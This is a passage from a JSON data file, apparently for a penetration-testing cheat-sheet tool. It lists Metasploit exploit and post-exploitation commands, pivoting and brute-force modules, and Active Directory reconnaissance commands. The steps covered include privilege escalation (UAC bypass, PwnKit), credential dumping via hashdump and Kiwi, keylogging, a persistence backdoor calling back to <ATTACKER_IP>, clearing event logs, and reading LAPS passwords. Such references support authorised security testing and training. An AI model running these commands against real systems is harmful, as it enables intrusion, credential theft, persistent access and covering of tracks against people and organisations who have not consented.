              "set RHOSTS <TARGET_IP>",
              "set USERNAME <USER>",
              "set PASSWORD <PASS>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "UAC Bypass FodHelper",
            "desc": "Local UAC bypass",
            "cmds": [
              "use exploit/windows/local/bypassuac_fodhelper",
              "set SESSION <ID>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "PwnKit",
            "desc": "Linux pkexec privesc",
            "cmds": [
              "use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
              "set SESSION <ID>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Meterpreter Post-Exploitation",
        "commands": [
          {
            "title": "System Information",
            "cmd": "sysinfo",
            "tags": [
              "essential"
            ],
            "desc": "Display target system information from meterpreter"
          },
          {
            "title": "Current User ID",
            "cmd": "getuid",
            "tags": [
              "essential"
            ],
            "desc": "Show the user the meterpreter process is running as"
          },
          {
            "title": "Elevate to SYSTEM",
            "cmd": "getsystem",
            "tags": [
              "essential"
            ],
            "desc": "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM"
          },
          {
            "title": "Dump Password Hashes",
            "cmd": "hashdump",
            "tags": [
              "essential"
            ],
            "desc": "Dump SAM database password hashes (requires SYSTEM)"
          },
          {
            "title": "Load Kiwi (Mimikatz)",
            "cmd": "load kiwi",
            "tags": [
              "essential"
            ],
            "desc": "Load the Kiwi extension for credential extraction"
          },
          {
            "title": "Dump All Credentials",
            "cmd": "creds_all",
            "tags": [
              "essential"
            ],
            "desc": "Dump all credentials including Kerberos tickets via Kiwi"
          },
          {
            "title": "Dump Kerberos Credentials",
            "cmd": "kerberos",
            "tags": [
              "advanced"
            ],
            "desc": "Dump Kerberos tickets from memory via Kiwi"
          },
          {
            "title": "Dump WiFi Passwords",
            "cmd": "wifi_list",
            "tags": [
              "advanced"
            ],
            "desc": "List and dump saved WiFi credentials via Kiwi"
          },
          {
            "title": "Upload File to Target",
            "cmd": "upload /path/to/local/file C:\\\\Windows\\\\Temp\\\\file",
            "tags": [
              "essential"
            ],
            "desc": "Upload a file from attacker to target machine"
          },
          {
            "title": "Download File from Target",
            "cmd": "download C:\\\\Users\\\\<USER>\\\\Desktop\\\\secrets.txt /tmp/loot/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from target to attacker machine"
          },
          {
            "title": "Search for Files",
            "cmd": "search -f *.txt -d C:\\\\Users\\\\",
            "tags": [
              "essential"
            ],
            "desc": "Search for files matching a pattern on the target"
          },
          {
            "title": "Search for Password Files",
            "cmd": "search -f *pass* -d C:\\\\",
            "tags": [
              "tool"
            ],
            "desc": "Search for files containing password in the name"
          },
          {
            "title": "List Running Processes",
            "cmd": "ps",
            "tags": [
              "essential"
            ],
            "desc": "List all running processes on the target"
          },
          {
            "title": "Migrate to Another Process",
            "cmd": "migrate <PID>",
            "tags": [
              "essential"
            ],
            "desc": "Migrate meterpreter to a different process for stability or privilege"
          },
          {
            "title": "Drop to System Shell",
            "cmd": "shell",
            "tags": [
              "essential"
            ],
            "desc": "Open an interactive system command shell"
          },
          {
            "title": "Background Current Session",
            "cmd": "background",
            "tags": [
              "essential"
            ],
            "desc": "Background the current meterpreter session"
          },
          {
            "title": "Screenshot",
            "cmd": "screenshot",
            "tags": [
              "tool"
            ],
            "desc": "Capture a screenshot of the target's desktop"
          },
          {
            "title": "Keylog Start",
            "cmd": "keyscan_start",
            "tags": [
              "advanced"
            ],
            "desc": "Start capturing keystrokes on the target"
          },
          {
            "title": "Keylog Dump",
            "cmd": "keyscan_dump",
            "tags": [
              "advanced"
            ],
            "desc": "Dump captured keystrokes"
          },
          {
            "title": "Enable RDP",
            "cmd": "run post/windows/manage/enable_rdp",
            "tags": [
              "advanced"
            ],
            "desc": "Enable Remote Desktop on the target"
          },
          {
            "title": "Persistence via Registry",
            "cmd": "run persistence -U -i 10 -p <PORT> -r <ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Install a persistent reverse connection backdoor"
          },
          {
            "title": "Local Exploit Suggester",
            "cmd": "run post/multi/recon/local_exploit_suggester",
            "tags": [
              "essential"
            ],
            "desc": "Suggest local privilege escalation exploits for the target"
          },
          {
            "title": "Enum Logged On Users",
            "cmd": "run post/windows/gather/enum_logged_on_users",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate currently and recently logged on users"
          },
          {
            "title": "Enum Shares",
            "cmd": "run post/windows/gather/enum_shares",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate network shares on the target"
          },
          {
            "title": "Enum Linux System",
            "cmd": "run post/linux/gather/enum_system",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate system information on a Linux target"
          },
          {
            "title": "Clear Event Logs",
            "desc": "Cover tracks",
            "cmd": "clearev",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Keylogger",
            "desc": "Start keylogger",
            "cmds": [
              "keyscan_start",
              "keyscan_dump",
              "keyscan_stop"
            ],
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Shell to Meterpreter",
            "desc": "Upgrade shell",
            "cmds": [
              "use post/multi/manage/shell_to_meterpreter",
              "set SESSION <ID>",
              "run"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Session Pivoting & Routing",
        "commands": [
          {
            "title": "List Active Sessions",
            "cmd": "sessions -l",
            "tags": [
              "essential"
            ],
            "desc": "List all active meterpreter/shell sessions"
          },
          {
            "title": "Interact with Session",
            "cmd": "sessions -i <SESSION_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Interact with a specific session by ID"
          },
          {
            "title": "Kill All Sessions",
            "cmd": "sessions -K",
            "tags": [
              "tool"
            ],
            "desc": "Terminate all active sessions"
          },
          {
            "title": "Auto-Route via Session",
            "cmds": [
              "use post/multi/manage/autoroute",
              "set SESSION <SESSION_ID>",
              "set SUBNET <INTERNAL_SUBNET>",
              "set NETMASK 255.255.255.0",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Add a route to an internal network through a meterpreter session"
          },
          {
            "title": "Auto-Route (Meterpreter)",
            "cmd": "run autoroute -s <INTERNAL_SUBNET>/24",
            "tags": [
              "essential"
            ],
            "desc": "Add route from within a meterpreter session"
          },
          {
            "title": "Print Routes",
            "cmd": "run autoroute -p",
            "tags": [
              "tool"
            ],
            "desc": "Display all routes added through meterpreter sessions"
          },
          {
            "title": "SOCKS Proxy for Pivoting",
            "cmds": [
              "use auxiliary/server/socks_proxy",
              "set SRVHOST 127.0.0.1",
              "set SRVPORT 1080",
              "set VERSION 5",
              "run -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a SOCKS5 proxy to route tools through the pivot"
          },
          {
            "title": "Port Forward (Local)",
            "cmd": "portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Forward a local port to a remote service through meterpreter"
          },
          {
            "title": "Port Forward (List)",
            "cmd": "portfwd list",
            "tags": [
              "tool"
            ],
            "desc": "List all active port forwards"
          },
          {
            "title": "Port Forward (Flush)",
            "cmd": "portfwd flush",
            "tags": [
              "tool"
            ],
            "desc": "Remove all active port forwards"
          },
          {
            "title": "Upgrade Shell to Meterpreter",
            "cmds": [
              "use post/multi/manage/shell_to_meterpreter",
              "set SESSION <SESSION_ID>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Upgrade a basic shell session to a meterpreter session"
          }
        ]
      },
      {
        "name": "Auxiliary Modules",
        "commands": [
          {
            "title": "SMB Version Scanner",
            "cmds": [
              "use auxiliary/scanner/smb/smb_version",
              "set RHOSTS <TARGET_RANGE>",
              "set THREADS 10",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Scan for SMB versions across a range of hosts"
          },
          {
            "title": "TCP Port Scanner",
            "cmds": [
              "use auxiliary/scanner/portscan/tcp",
              "set RHOSTS <TARGET_RANGE>",
              "set PORTS 1-1024",
              "set THREADS 20",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Perform a TCP port scan through a pivot"
          },
          {
            "title": "SMB Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/smb/smb_login",
              "set RHOSTS <TARGET_IP>",
              "set SMBUser <USER>",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force SMB authentication credentials"
          },
          {
            "title": "SSH Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/ssh/ssh_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME <USER>",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "set THREADS 5",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force SSH credentials"
          },
          {
            "title": "FTP Anonymous Check",
            "cmds": [
              "use auxiliary/scanner/ftp/anonymous",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Check for anonymous FTP access on targets"
          },
          {
            "title": "HTTP Directory Scanner",
            "cmds": [
              "use auxiliary/scanner/http/dir_scanner",
              "set RHOSTS <TARGET_IP>",
              "set THREADS 10",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for common directories on web servers"
          },
          {
            "title": "SNMP Community Scanner",
            "cmds": [
              "use auxiliary/scanner/snmp/snmp_enum",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate SNMP community strings and information"
          },
          {
            "title": "VNC None Auth Scanner",
            "cmds": [
              "use auxiliary/scanner/vnc/vnc_none_auth",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for VNC servers with no authentication"
          },
          {
            "title": "MSSQL Login Scanner",
            "cmds": [
              "use auxiliary/scanner/mssql/mssql_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME sa",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force Microsoft SQL Server credentials"
          },
          {
            "title": "HTTP Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/http/http_login",
              "set RHOSTS <TARGET_IP>",
              "set AUTH_URI /admin/",
              "set USER_FILE users.txt",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force HTTP Basic/Digest authentication"
          },
          {
            "title": "MySQL Login Scanner",
            "cmds": [
              "use auxiliary/scanner/mysql/mysql_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME root",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force MySQL credentials"
          },
          {
            "title": "NFS Share Scanner",
            "cmds": [
              "use auxiliary/scanner/nfs/nfsmount",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for NFS shares across the network"
          },
          {
            "title": "SMTP User Enum",
            "cmds": [
              "use auxiliary/scanner/smtp/smtp_enum",
              "set RHOSTS <TARGET_IP>",
              "set USER_FILE /usr/share/seclists/Usernames/Names/names.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users via SMTP VRFY/EXPN/RCPT"
          },
          {
            "title": "RDP BlueKeep Scanner",
            "cmds": [
              "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for CVE-2019-0708 BlueKeep vulnerability"
          },
          {
            "title": "HTTP WordPress Scanner",
            "cmds": [
              "use auxiliary/scanner/http/wordpress_scanner",
              "set RHOSTS <TARGET_IP>",
              "set TARGETURI /wordpress/",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan WordPress installations for common issues"
          },
          {
            "title": "IPMI Hash Dumper",
            "cmds": [
              "use auxiliary/scanner/ipmi/ipmi_dumphashes",
              "set RHOSTS <TARGET_IP>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Dump IPMI password hashes (RAKP authentication)"
          }
        ]
      },
      {
        "name": "Post-Exploitation Modules",
        "commands": [
          {
            "title": "Windows Gather Credentials",
            "cmd": "run post/windows/gather/credentials/credential_collector",
            "tags": [
              "tool"
            ],
            "desc": "Collect various credentials from the target"
          },
          {
            "title": "Windows Enum Applications",
            "cmd": "run post/windows/gather/enum_applications",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate installed applications on Windows target"
          },
          {
            "title": "Windows Enum Services",
            "cmd": "run post/windows/gather/enum_services",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate running services on Windows target"
          },
          {
            "title": "Windows Enum Patches",
            "cmd": "run post/windows/gather/enum_patches",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate installed patches and hotfixes"
          },
          {
            "title": "Windows Check VM",
            "cmd": "run post/windows/gather/checkvm",
            "tags": [
              "tool"
            ],
            "desc": "Detect if target is a virtual machine"
          },
          {
            "title": "Windows Enum Domain",
            "cmd": "run post/windows/gather/enum_domain",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain information from Windows target"
          },
          {
            "title": "Windows Enum Domain Users",
            "cmd": "run post/windows/gather/enum_ad_users",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Active Directory users"
          },
          {
            "title": "Windows Enum Domain Groups",
            "cmd": "run post/windows/gather/enum_ad_groups",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Active Directory groups"
          },
          {
            "title": "Linux Enum Network",
            "cmd": "run post/linux/gather/enum_network",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate network configuration on Linux target"
          },
          {
            "title": "Linux Enum Users/History",
            "cmd": "run post/linux/gather/enum_users_history",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users and their command history"
          },
          {
            "title": "Linux Hashdump",
            "cmd": "run post/linux/gather/hashdump",
            "tags": [
              "essential"
            ],
            "desc": "Dump password hashes from /etc/shadow"
          },
          {
            "title": "Multi Gather SSH Creds",
            "cmd": "run post/multi/gather/ssh_creds",
            "tags": [
              "tool"
            ],
            "desc": "Collect SSH keys and known hosts from target"
          },
          {
            "title": "Multi Gather Firefox Creds",
            "cmd": "run post/multi/gather/firefox_creds",
            "tags": [
              "tool"
            ],
            "desc": "Extract saved passwords from Firefox profiles"
          },
          {
            "title": "Multi Manage Autoroute",
            "cmd": "run post/multi/manage/autoroute",
            "tags": [
              "essential"
            ],
            "desc": "Add routes to internal subnets through the session"
          }
        ]
      }
    ]
  },
  {
    "id": "ad-recon",
    "name": "Active Directory Reconnaissance",
    "icon": "🏢",
    "description": "Enumerate Active Directory domains, users, groups, trusts, and attack paths",
    "subcategories": [
      {
        "name": "Domain Discovery",
        "commands": [
          {
            "title": "SharpHound Collection (All)",
            "cmd": "SharpHound.exe -c All --outputdirectory C:\\Temp\\",
            "tags": [
              "essential"
            ],
            "desc": "Collect all BloodHound data from the domain"
          },
          {
            "title": "SharpHound (Stealth)",
            "cmd": "SharpHound.exe -c DCOnly --stealth",
            "tags": [
              "advanced"
            ],
            "desc": "Collect BloodHound data using only DC queries for stealth"
          },
          {
            "title": "BloodHound-Python (Remote)",
            "cmd": "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all",
            "tags": [
              "essential"
            ],
            "desc": "Collect BloodHound data remotely from Linux"
          },
          {
            "title": "Start Neo4j for BloodHound",
            "cmd": "sudo neo4j console",
            "tags": [
              "essential"
            ],
            "desc": "Start the Neo4j database backend for BloodHound"
          },
          {
            "title": "PowerView Get-Domain",
            "cmd": "Get-Domain",
            "tags": [
              "essential"
            ],
            "desc": "Get information about the current domain"
          },
          {
            "title": "PowerView Get-DomainController",
            "cmd": "Get-DomainController",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate domain controllers in the current domain"
          },
          {
            "title": "AD Module Get-ADDomain",
            "cmd": "Get-ADDomain",
            "tags": [
              "essential"
            ],
            "desc": "Get detailed domain information via AD PowerShell module"
          },
          {
            "title": "Enum4linux-ng Full Scan",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Comprehensive SMB/LDAP/RPC enumeration"
          },
          {
            "title": "LDAP Domain Dump",
            "cmd": "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' --no-json --no-grep",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain objects via LDAP into HTML reports"
          },
          {
            "title": "Windapsearch Users",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -U",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain users via LDAP"
          },
          {
            "title": "Windapsearch Computers",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -C",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain computers via LDAP"
          },
          {
            "title": "Kerbrute User Enumeration",
            "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /path/to/userlist.txt",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate valid domain usernames via Kerberos without authentication"
          },
          {
            "title": "Impacket GetADUsers",
            "cmd": "impacket-GetADUsers -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain users via LDAP with impacket"
          },
          {
            "title": "Impacket Lookupsid",
            "cmd": "impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain SIDs and associated accounts via RPC"
          },
          {
            "title": "DNS Zone Transfer Attempt",
            "cmd": "dig axfr <DOMAIN> @<DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Attempt a DNS zone transfer from a domain controller"
          },
          {
            "title": "PingCastle",
            "desc": "AD security assessment",
            "cmd": ".\\PingCastle.exe --healthcheck --server <DC_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "ldapdomaindump",
            "desc": "Dump AD via LDAP",
            "cmd": "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o ldapdump/",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "User & Group Enumeration",
        "commands": [
          {
            "title": "PowerView Get All Users",
            "cmd": "Get-DomainUser | Select-Object samaccountname, description, memberof",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain users with key attributes"
          },
          {
            "title": "PowerView Get Specific User",
            "cmd": "Get-DomainUser -Identity <USER> -Properties *",
            "tags": [
              "essential"
            ],
            "desc": "Get all properties for a specific domain user"
          },
          {
            "title": "PowerView Get Domain Groups",
            "cmd": "Get-DomainGroup | Select-Object samaccountname",
            "tags": [
              "essential"
            ],
            "desc": "List all domain groups"
          },
          {
            "title": "PowerView Get Group Members",
            "cmd": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
            "tags": [
              "essential"
            ],
            "desc": "Recursively enumerate members of Domain Admins"
          },
          {
            "title": "PowerView Get Domain Computers",
            "cmd": "Get-DomainComputer | Select-Object dnshostname, operatingsystem",
            "tags": [
              "essential"
            ],
            "desc": "List all domain computers with OS info"
          },
          {
            "title": "PowerView Get Domain OUs",
            "cmd": "Get-DomainOU | Select-Object name, distinguishedname",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate all Organizational Units in the domain"
          },
          {
            "title": "PowerView Get Domain GPOs",
            "cmd": "Get-DomainGPO | Select-Object displayname, gpcfilesyspath",
            "tags": [
              "tool"
            ],
            "desc": "List all Group Policy Objects in the domain"
          },
          {
            "title": "AD Module Get-ADUser (All)",
            "cmd": "Get-ADUser -Filter * -Properties * | Select-Object samaccountname, description, lastlogondate",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all AD users with properties"
          },
          {
            "title": "AD Module Get-ADGroup",
            "cmd": "Get-ADGroup -Filter * | Select-Object name, groupscope",
            "tags": [
              "tool"
            ],
            "desc": "List all AD groups with their scope"
          },
          {
            "title": "AD Module Get-ADComputer",
            "cmd": "Get-ADComputer -Filter * -Properties * | Select-Object name, operatingsystem, lastlogondate",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate all AD computers with OS and last logon"
          },
          {
            "title": "Net User Domain Query",
            "cmd": "net user /domain",
            "tags": [
              "essential"
            ],
            "desc": "List all domain users via built-in Windows command"
          },
          {
            "title": "Net Group Domain Admins",
            "cmd": "net group \"Domain Admins\" /domain",
            "tags": [
              "essential"
            ],
            "desc": "List members of Domain Admins via built-in command"
          },
          {
            "title": "Find Users with Descriptions",
            "cmd": "Get-DomainUser -LDAPFilter '(description=*)' | Select-Object samaccountname, description",
            "tags": [
              "tool"
            ],
            "desc": "Find users with descriptions that may contain passwords",
            "note": "Descriptions often contain password hints or temporary passwords"
          },
          {
            "title": "PowerView Find Local Admin Access",
            "cmd": "Find-LocalAdminAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find machines where the current user has local admin access"
          },
          {
            "title": "PowerView Get-NetSession",
            "cmd": "Get-NetSession -ComputerName <DC_HOSTNAME>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate active sessions on a target computer"
          },
          {
            "title": "PowerView Get-NetLoggedon",
            "cmd": "Get-NetLoggedon -ComputerName <TARGET_HOSTNAME>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users logged onto a target computer"
          },
          {
            "title": "PowerView Invoke-ShareFinder",
            "cmd": "Invoke-ShareFinder -Verbose -CheckShareAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find accessible network shares across the domain"
          },
          {
            "title": "PowerView Get-DomainSID",
            "cmd": "Get-DomainSID",
            "tags": [
              "essential"
            ],
            "desc": "Get the current domain SID"
          },
          {
            "title": "PowerView Find-LocalAdminAccess Threaded",
            "cmd": "Find-LocalAdminAccess -Threads 20",
            "tags": [
              "essential"
            ],
            "desc": "Find machines where current user has local admin (threaded)"
          },
          {
            "title": "Windapsearch Groups",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -G",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain groups via LDAP"
          },
          {
            "title": "Windapsearch Privileged Users",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --da",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain admins via LDAP"
          },
          {
            "title": "Windapsearch Unconstrained Delegation",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --unconstrained",
            "tags": [
              "tool"
            ],
            "desc": "Find unconstrained delegation computers via LDAP"
          },
          {
            "title": "LDAP Domain Dump HTML",
            "cmd": "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' -o /tmp/ldap_dump/",
            "tags": [
              "essential"
            ],
            "desc": "Generate browsable HTML reports of domain objects"
          },
          {
            "title": "Kerbrute Brute Force",
            "cmd": "kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> /usr/share/wordlists/rockyou.txt <USER>",
            "tags": [
              "tool"
            ],
            "desc": "Brute force a single user password via Kerberos"
          },
          {
            "title": "Enum GPO Permissions",
            "cmd": "Get-DomainGPO | ForEach-Object { Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs } | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner' } | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName",
            "tags": [
              "advanced"
            ],
            "desc": "Find GPOs that can be modified by non-admin users"
          },
          {
            "title": "Enum GPO Linked to OUs",
            "cmd": "Get-DomainOU | ForEach-Object { $ou = $_; ($_.gplink -split '\\[LDAP://') | ForEach-Object { if($_) { [PSCustomObject]@{OU=$ou.name; GPO=$_.split(';')[0].TrimEnd(']')} } } }",
            "tags": [
              "advanced"
            ],
            "desc": "Map GPOs to their linked Organizational Units"
          },
          {
            "title": "LAPS Check via CrackMapExec",
            "cmd": "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> -M laps",
            "tags": [
              "essential"
            ],
            "desc": "Check if LAPS passwords are readable"
          },
          {
            "title": "ADRecon Comprehensive Report",
            "cmd": "powershell -ep bypass -c \"Import-Module .\\ADRecon.ps1; Invoke-ADRecon -Method LDAP -DomainController <DC_IP> -Credential $cred\"",
            "tags": [
              "tool"
            ],
            "desc": "Generate comprehensive AD reconnaissance report"
          }
        ]
      },
      {
        "name": "ACL Analysis",
        "commands": [
          {
            "title": "Find Interesting Domain ACLs",
            "cmd": "Find-InterestingDomainAcl -ResolveGUIDs",
            "tags": [
              "essential"
            ],
            "desc": "Find ACLs with interesting permissions across the domain"
          },
          {
            "title": "Get ACL for Specific User",
            "cmd": "Get-DomainObjectAcl -Identity <USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'}",
            "tags": [
              "essential"
            ],
            "desc": "Check what permissions exist on a specific user object"
          },
          {
            "title": "Find ACLs for Current User",
            "cmd": "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match '<USER>'}",
            "tags": [
              "essential"
            ],
            "desc": "Find all ACL entries that grant permissions to a specific user"
          },
          {
            "title": "Get ACL on Domain Object",
            "cmd": "Get-DomainObjectAcl -SearchBase 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq 'GenericAll'}",
            "tags": [
              "advanced"
            ],
            "desc": "Search for GenericAll permissions at the domain level"
          },
          {
            "title": "Check WriteDACL on Group",
            "cmd": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Check who has WriteDACL permission on Domain Admins"
          },
          {
            "title": "Enumerate GPO Permissions",
            "cmd": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Find writable Group Policy Objects for potential abuse"
          }
        ]
      },
      {
        "name": "Trust Mapping",
        "commands": [
          {
            "title": "PowerView Get Domain Trusts",
            "cmd": "Get-DomainTrust",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain trust relationships"
          },
          {
            "title": "PowerView Get Forest Trusts",
            "cmd": "Get-ForestTrust",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate forest-level trust relationships"
          },
          {
            "title": "AD Module Get-ADTrust",
            "cmd": "Get-ADTrust -Filter *",
            "tags": [
              "essential"
            ],
            "desc": "List all AD trust relationships via AD module"
          },
          {
            "title": "Map All Domain Trusts",
            "cmd": "Get-DomainTrust -Domain <DOMAIN> | Select-Object SourceName, TargetName, TrustDirection, TrustType",
            "tags": [
              "tool"
            ],
            "desc": "Map trust direction and type for all trusts"
          },
          {
            "title": "Enumerate Foreign Group Members",
            "cmd": "Get-DomainForeignGroupMember -Domain <DOMAIN>",
            "tags": [
              "advanced"
            ],
            "desc": "Find users from foreign domains in local groups"
          },
          {
            "title": "Find Domain Shares",
            "cmd": "Find-DomainShare -CheckShareAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find accessible domain shares across the network"
          },
          {
            "title": "Invoke-ShareFinder",
            "cmd": "Invoke-ShareFinder -Verbose",
            "tags": [
              "essential"
            ],
            "desc": "Discover and enumerate network shares across the domain"
          }
        ]
      },
      {
        "name": "SPN & Delegation Discovery",
        "commands": [
          {
            "title": "Find Kerberoastable Users",
            "cmd": "Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname",
            "tags": [
              "essential"
            ],
            "desc": "Find users with SPNs set (Kerberoastable)"
          },
          {
            "title": "Find AS-REP Roastable Users",
            "cmd": "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname",
            "tags": [
              "essential"
            ],
            "desc": "Find users with Kerberos pre-auth disabled"
          },
          {
            "title": "Setspn Query All SPNs",
            "cmd": "setspn -T <DOMAIN> -Q */*",
            "tags": [
              "essential"
            ],
            "desc": "Query all registered SPNs in the domain"
          },
          {
            "title": "Find Unconstrained Delegation",
            "cmd": "Get-DomainComputer -Unconstrained | Select-Object dnshostname",
            "tags": [
              "essential"
            ],
            "desc": "Find computers with unconstrained delegation enabled"
          },
          {
            "title": "Find Constrained Delegation",
            "cmd": "Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto",
            "tags": [
              "essential"
            ],
            "desc": "Find computers with constrained delegation configured"
          },
          {
            "title": "Find User Constrained Delegation",
            "cmd": "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
            "tags": [
              "tool"
            ],
            "desc": "Find users with constrained delegation configured"
          },
          {
            "title": "Find RBCD Targets",
            "cmd": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Find computers where RBCD can be configured"
          },
          {
            "title": "LAPS Password Discovery",
            "cmd": "Get-DomainComputer | ? {'ms-Mcs-AdmPwd' -in $_.Properties.PropertyNames} | Select-Object dnshostname, ms-mcs-admpwd",
            "tags": [
              "essential"
            ],
            "desc": "Read LAPS passwords if the current user has access",
            "note": "Requires read permission on ms-Mcs-AdmPwd attribute"
          },
          {
